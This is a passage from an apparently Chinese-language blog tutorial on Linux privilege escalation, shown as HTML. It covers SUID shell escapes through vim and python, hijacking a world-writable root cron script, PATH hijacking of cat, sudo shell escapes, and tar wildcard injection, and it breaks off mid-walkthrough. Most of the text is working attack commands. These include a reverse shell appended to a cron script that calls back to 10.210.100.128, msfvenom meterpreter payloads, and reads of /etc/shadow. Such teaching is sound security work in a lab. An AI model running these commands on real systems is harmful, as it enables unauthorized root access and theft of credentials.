+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">vim -c &#x27;:py import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-pc&quot;</span>, <span class="hljs-string">&quot;reset; exec sh -p&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110142448286.png" srcset="/img/loading.gif" lazyload alt="image-20240110142448286"> </p>
+<h4 id="PYTHON提权"><a href="#PYTHON提权" class="headerlink" title="PYTHON提权"></a>PYTHON提权</h4><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">python -c &#x27;import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>参考： <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>等等</p>
+<h2 id="3-计划任务提权"><a href="#3-计划任务提权" class="headerlink" title="3.计划任务提权"></a>3.计划任务提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><p>linux计划任务提权是因为权限配置不当，计划任务以root权限运行，低权限的用户可以修改计划任务的文件，从而被攻击者利用，导致提权，Linux计划任务命令如下</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crontab</span> -e 编辑计划任务<br>crontab -l 查看计划任务<br>crontab -r 删除目前的crontab<br></code></pre></td></tr></table></figure>
+
+<p>计划任务的文件夹在 &#x2F;etc&#x2F;cron*下</p>
+<p><img src="/img/image-20240110144808035.png" srcset="/img/loading.gif" lazyload alt="image-20240110144808035"> </p>
+<p>计划任务的格式：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">分 时 日 月 周 用户 命令<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110150757454.png" srcset="/img/loading.gif" lazyload alt="image-20240110150757454"></p>
+<p>假如root用户设置了一个计划任务，但是权限没有设置好，</p>
+<p>比如777权限或者SUID权限之类的,查找命令如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> 查找SUID文件<br><span class="hljs-built_in">find</span> / -perm 777 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> 查找777文件<br></code></pre></td></tr></table></figure>
+
+<p>linux文件权第一部分是该文件的拥有者所拥有的权限，第二部分是该文件所在用户组的用户所拥有的权 限，最后一部分是其他用户所拥有的权限</p>
+<h3 id="提权环境"><a href="#提权环境" class="headerlink" title="提权环境"></a>提权环境</h3><p>先准备一个SUID文件或者权限为xx7的文件，让低权限的用户可以执行文件的修改，在这里我们我们准备一个sh文件或者python文件都可以，我们写一个linux运维脚本，来监控当前电脑的运行参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">bash_os</span></span>() &#123;<br><span class="hljs-comment"># &quot;系统基础信息&quot;</span><br><span class="hljs-comment">#内核信息</span><br>kernel=$(<span class="hljs-built_in">uname</span> -r)<br><span class="hljs-comment">#操作系统版本</span><br>release=$(<span class="hljs-built_in">cat</span> /etc/redhat-release)<br><span class="hljs-comment">#主机名称</span><br>hostname=<span class="hljs-variable">$HOSTNAME</span><br><span class="hljs-comment">#当前时间及运行时间</span><br>dateload=$(<span class="hljs-built_in">uptime</span> | awk -F <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><span class="hljs-comment"># 当前登录用户数</span><br><span class="hljs-built_in">users</span>=$(<span class="hljs-built_in">uptime</span> | awk -F <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\033[32m############## 系统基础信息 #######\033[0m\n&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|内核信息:\033[31m <span class="hljs-variable">$kernel</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|操作系统版本:\033[31m <span class="hljs-variable">$release</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|当前时间及运行时间:\033[31m <span class="hljs-variable">$dateload</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|当前登录用户数:\033[31m <span class="hljs-variable">$users</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br>&#125;<br>bash_os<br></code></pre></td></tr></table></figure>
+
+<p>该脚本运行后的内容写到 &#x2F;tmp&#x2F;bash_os.txt文件中</p>
+<p><img src="/img/image-20240110152219692.png" srcset="/img/loading.gif" lazyload alt="image-20240110152219692"> </p>
+<p>将文件的权限设置成777 chmod 777 bash_os.sh</p>
+<p><img src="/img/image-20240110152243783.png" srcset="/img/loading.gif" lazyload alt="image-20240110152243783"> </p>
+<p>将文件设置成计划任务，输入 vim &#x2F;cat&#x2F;cronta 进行编辑，编辑内容如下，一定是普通用户，到</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">分 时 日 月 周 用户 命令<br>*<span class="hljs-regexp">/1 * * * * root /</span>bash_os.sh<br>service crond status 查看计划任务启动<br>service crond restart 重启计划任务<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110152438332.png" srcset="/img/loading.gif" lazyload alt="image-20240110152438332"> </p>
+<h3 id="提权实验"><a href="#提权实验" class="headerlink" title="提权实验"></a>提权实验</h3><p>1.我们先拿到一个webshell，或者MSF的shell，或者CS的shell先上线，这里使用MSF的shell，生成MSF 的payload然后上线</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110154741151.png" srcset="/img/loading.gif" lazyload alt="image-20240110154741151"> </p>
+<p>2.查询计划任务，发现存在一个sh文件并且是root运行的、</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110154836819.png" srcset="/img/loading.gif" lazyload alt="image-20240110154836819"> </p>
+<p>3.接下来查看该文件的属性看看能不能更改，发现是777满权限，更改文件内容，进行提权</p>
+<p><img src="/img/image-20240110154858676.png" srcset="/img/loading.gif" lazyload alt="image-20240110154858676"> </p>
+<p>4.输入反弹shell的命令，在sh文件中进行追加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.210.100.128/9876 0&gt;&amp;1&quot;</span> &gt;&gt; /bash_os.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110155004695.png" srcset="/img/loading.gif" lazyload alt="image-20240110155004695"> </p>
+<p>5.使用NC接收等待反弹shell的连接，得到root权限</p>
+<p><img src="/img/image-20240110155207149.png" srcset="/img/loading.gif" lazyload alt="image-20240110155207149"></p>
+<h2 id="4-环境变量劫持提权"><a href="#4-环境变量劫持提权" class="headerlink" title="4.环境变量劫持提权"></a>4.环境变量劫持提权</h2><h3 id="提权原理-2"><a href="#提权原理-2" class="headerlink" title="提权原理"></a>提权原理</h3><p>PATH是Linux和类Unix操作系统中的环境变量，类似windows中的path环境变量，<strong>当我们执行一个命令的时候shell会先检查命令是否是系统内部命令，如果不是则会再去检查此命令是否是一个应用程序， shell会试着从PATH中逐步查找命令</strong>，查看环境变量命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <span class="hljs-comment">#查看环境变量</span><br></code></pre></td></tr></table></figure>
+
+<p>如果我们可以在环境变量中写入自己的环境变量，然后写一个自己的恶意命令，从而达到提权的目的</p>
+<h3 id="提权环境-1"><a href="#提权环境-1" class="headerlink" title="提权环境"></a>提权环境</h3><p>当前的环境是ubuntu 16，centos7测试不成功 </p>
+<p>假设管理员用户在&#x2F;home目录下创建了一个demo.c文件，内容如下，执行查看shadow文件命令， setuid 规定了其运行用户，以root权限进行编译和权限设置</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span>&lt;unistd<span class="hljs-selector-class">.h</span>&gt;<br>void <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(&quot;cat /etc/shadow&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110160653508.png" srcset="/img/loading.gif" lazyload alt="image-20240110160653508">  </p>
+<p>然后使用gcc进行编译</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">gcc demo.c -o <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<p>运行 shell 命令就是打开shadow文件</p>
+<p><img src="/img/image-20240110161406810.png" srcset="/img/loading.gif" lazyload alt="image-20240110161406810"> </p>
+<p>赋予shell文件SUID权限 chmod u+s shell</p>
+<p><img src="/img/image-20240110161418339.png" srcset="/img/loading.gif" lazyload alt="image-20240110161418339"></p>
+<h3 id="提权实验-1"><a href="#提权实验-1" class="headerlink" title="提权实验"></a>提权实验</h3><p>首先上线机器</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110161440765.png" srcset="/img/loading.gif" lazyload alt="image-20240110161440765"> </p>
+<p>接下来用命令查找SUID文件，发现一个shell文件被配置了SUID</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110161459732.png" srcset="/img/loading.gif" lazyload alt="image-20240110161459732" style="zoom:80%;" /> 
+
+<p>运行shell文件，发现是查看&#x2F;etc&#x2F;shadow的命令</p>
+<p><img src="/img/image-20240110161513977.png" srcset="/img/loading.gif" lazyload alt="image-20240110161513977"> </p>
+<p>那么我们 <strong>劫持cat命令</strong> ，达到提权的目的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">ls</span> -al <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span>	<span class="hljs-comment">#添加临时环境变量</span><br>./home/shell	<span class="hljs-comment">#执行管理员配置的命令 执行cat命令</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110161616276.png" srcset="/img/loading.gif" lazyload alt="image-20240110161616276"> </p>
+<h2 id="5-SUDO提权"><a href="#5-SUDO提权" class="headerlink" title="5.SUDO提权"></a>5.SUDO提权</h2><h3 id="提权原理-3"><a href="#提权原理-3" class="headerlink" title="提权原理"></a>提权原理</h3><p>sudo是linux系统管理指令<strong>，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</strong>， 如reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对 shell的一个代替，它是面向每个命令的。在一些应用场景里面，为了方便运维人员以低权限帐号进行运 维，往往会开启帐号的一些SUDO权限给运维帐号，<strong>而SUDO权限的授予在&#x2F;etc&#x2F;sudoers中进行操作</strong></p>
+<p>具体的格式如下</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cseroad <span class="hljs-variable constant_">ALL</span>=(<span class="hljs-variable constant_">ALL</span><span class="hljs-symbol">:ALL</span>) <span class="hljs-variable constant_">NOPASSWD</span><span class="hljs-symbol">:/usr/bin/apt-get</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>cseroad表示用户名 </p>
+</li>
+<li><p>第一个 ALL 指示允许从任何终端访问sudo </p>
+</li>
+<li><p>第二个 (ALL:ALL)指示sudo命令被允许任意用户、任意组执行 </p>
+</li>
+<li><p>第三个 NOPASSWD 表示不需要输入密码而可以sudo执行的命令</p>
+</li>
+</ul>
+<p><img src="/img/image-20240110163945848.png" srcset="/img/loading.gif" lazyload alt="image-20240110163945848"> </p>
+<p>但是想获取哪些命令设置了无密码sudo，还是需要查看 cat &#x2F;etc&#x2F;sudoers 文件或者 sudo -l 命令， 而这两条命令都需要一定权限或者知道当前用户密码</p>
+<p><img src="/img/image-20240110164420634.png" srcset="/img/loading.gif" lazyload alt="image-20240110164420634"> </p>
+<p>如果给sudo配置文件配置了ALL 或者以下的命令就可以进行提权</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">wget、find、<span class="hljs-keyword">cat</span>、apt、<span class="hljs-keyword">zip</span>、xxd、time、taskset、git、sed、pip、<span class="hljs-keyword">ed</span>、tmux、scp、perl、<br>bash、less、awk、<span class="hljs-keyword">man</span>、vi、env、ftp、<span class="hljs-keyword">ed</span>、screen<br></code></pre></td></tr></table></figure>
+
+<p>提权的命令如下</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gradle">一条命令提权的<br>sudo vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br>sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br>sudo xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br>sudo env <span class="hljs-regexp">/bin/</span>sh<br>sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br>sudo zip <span class="hljs-number">2</span>.zip <span class="hljs-number">1</span>.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br>sudo sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br>sudo <span class="hljs-keyword">find</span> <span class="hljs-regexp">/etc/</span>passwd -exec <span class="hljs-regexp">/bin/</span>sh \;<br>两条命令提权的<br>sudo git help config<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo less <span class="hljs-regexp">/etc/</span>hosts<br>!sh<br>sudo ed<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo man man<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110164952287.png" srcset="/img/loading.gif" lazyload alt="image-20240110164952287"> </p>
+<p><img src="/img/image-20240110165127162.png" srcset="/img/loading.gif" lazyload alt="image-20240110165127162"> </p>
+<h3 id="提权实验-2"><a href="#提权实验-2" class="headerlink" title="提权实验"></a>提权实验</h3><p>使用root用户配置&#x2F;etc&#x2F;sudoer配置文件，设置普通用户可以运行任意命令</p>
+<p><img src="/img/image-20240110164914528.png" srcset="/img/loading.gif" lazyload alt="image-20240110164914528"> </p>
+<p>使用CS或者MSF或者webshell上线机器</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure>
+
+<p>使用sudo -l 查看，发现awk可以无密码进行使用</p>
+<img src="/img/image-20240110165026211.png" srcset="/img/loading.gif" lazyload alt="image-20240110165026211" style="zoom:80%;" /> 
+
+<p>接下来使用命令进行提权</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110165137653.png" srcset="/img/loading.gif" lazyload alt="image-20240110165137653" style="zoom:67%;" /> 
+
+<h2 id="6-利用通配符-WS-进行提权"><a href="#6-利用通配符-WS-进行提权" class="headerlink" title="6.利用通配符(WS)进行提权"></a>6.利用通配符(WS)进行提权</h2><h3 id="提权原理-4"><a href="#提权原理-4" class="headerlink" title="提权原理"></a>提权原理</h3><p>在LINUX中通配符可以被用来模糊匹配，而且通配符的输入是由当前用户的shell去进行解析</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* 代表任意数量的字符<br>? 字符代表单个字符<br><span class="hljs-selector-attr">[]</span> 匹配中括号中的任意单一字符 可以使用连字符-表示范围，比如<span class="hljs-selector-attr">[0-9]</span><br></code></pre></td></tr></table></figure>
+
+<p>我们在当前的目录创建几个文本，1.txt,2.txt,3.txt</p>
+<p><img src="/img/image-20240110165406805.png" srcset="/img/loading.gif" lazyload alt="image-20240110165406805"></p>
+<p>接下来使用通配符去查看文件 ls ?.txt 可以查到 一个字符后面加.txt的文件</p>
+<p><img src="/img/image-20240110165422191.png" srcset="/img/loading.gif" lazyload alt="image-20240110165422191"> </p>
+<p>我们在当前目录在创建几个文件，a.txt,ab.txt,abc.txt</p>
+<p><img src="/img/image-20240110165436692.png" srcset="/img/loading.gif" lazyload alt="image-20240110165436692"></p>
+<p>然后使用?进行匹配</p>
+<img src="/img/image-20240110165448140.png" srcset="/img/loading.gif" lazyload alt="image-20240110165448140" style="zoom:80%;" /> 
+
+<p>使用*进行匹配，代表<strong>任意的多个</strong>字符</p>
+<p><img src="/img/image-20240110165532144.png" srcset="/img/loading.gif" lazyload alt="image-20240110165532144">  </p>
+<p>使用ls [0-9].txt,匹配0-9的txt</p>
+<p><img src="/img/image-20240110165546432.png" srcset="/img/loading.gif" lazyload alt="image-20240110165546432"> </p>
+<p>[…] 匹配方括号之中的任意一个字符</p>
+<img src="/img/image-20240110165610462.png" srcset="/img/loading.gif" lazyload alt="image-20240110165610462" style="zoom:80%;" /> 
+
+<h4 id="什么是Wildcard-wildness-简称WS"><a href="#什么是Wildcard-wildness-简称WS" class="headerlink" title="什么是Wildcard wildness 简称WS"></a><strong>什么是Wildcard wildness 简称WS</strong></h4><p>我们先创建3个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; file1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; file2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110165746740.png" srcset="/img/loading.gif" lazyload alt="image-20240110165746740"></p>
+<p>接下来查看文件里面的内容，发现文件1和文件2都可以查看，但是–help查看不了，直接调出了–help 的命令，这种类型的技巧称为Wildcard wildness。</p>
+<p><img src="/img/image-20240110165814958.png" srcset="/img/loading.gif" lazyload alt="image-20240110165814958"></p>
+<p><strong>如果我们执行 ls * 那么就会执行 ls –help</strong>    <strong>即创建的–help文件将–help命令劫持了</strong></p>
+<p>如何利用这一点进行提权呢？</p>
+<p><strong>如果有的命令的参数中可以去执行linux命令，我们进行劫持，达到提权的目的</strong>，我们以tar命令为例子 </p>
+<p>tar命令是Linux中的压缩命令，可以对文件进行压缩</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.html</span> 将文件<span class="hljs-number">1</span>.html文件压缩成<span class="hljs-selector-tag">html</span>.tgz<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110170320323.png" srcset="/img/loading.gif" lazyload alt="image-20240110170320323"></p>
+<p>也可以使用通配符进行压缩</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> *<span class="hljs-selector-class">.html</span> 将文件所有html文件压缩成<span class="hljs-selector-tag">html</span>.tgz<br></code></pre></td></tr></table></figure>
+
+<p>在tar中有执行linux命令的参数如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">tar -czf 1.tgz 1.html <span class="hljs-attribute">--checkpoint</span>=1 <span class="hljs-attribute">--checkpoint-action</span>=exec=whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110170423586.png" srcset="/img/loading.gif" lazyload alt="image-20240110170423586"></p>
+<p>可以对后面的命令进行劫持 ,只需要要编写一个这样的参数文件就行可以了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint=1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint-action=<span class="hljs-built_in">exec</span>=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110170459127.png" srcset="/img/loading.gif" lazyload alt="image-20240110170459127"></p>
+<p>接着运行 </p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> *<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110170600574.png" srcset="/img/loading.gif" lazyload alt="image-20240110170600574" style="zoom:80%;" /> 
+
+<h3 id="提权实验-3"><a href="#提权实验-3" class="headerlink" title="提权实验"></a>提权实验</h3><p>一般都有备份网站的习惯，那么运维人员或管理员填写了备份文件的计划任务任务，如果滥用了通配符，就可能导致提权</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1 * * * * root tar -zcf /</span>var<span class="hljs-regexp">/html.tgz /</span>var<span class="hljs-regexp">/www/</span>html/*<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110170636346.png" srcset="/img/loading.gif" lazyload alt="image-20240110170636346"></p>
+<p>1.上线</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110170656754.png" srcset="/img/loading.gif" lazyload alt="image-20240110170656754" style="zoom:80%;" /> 
+
+<p>2.查看计划任务，发现有滥用通配符的，并且是root权限，可以进行提权</p>
+<p><img src="/img/image-20240110170712146.png" srcset="/img/loading.gif" lazyload alt="image-20240110170712146"></p>
+<p>3.在&#x2F;var&#x2F;www&#x2F;html下创建两个文件如下</p>
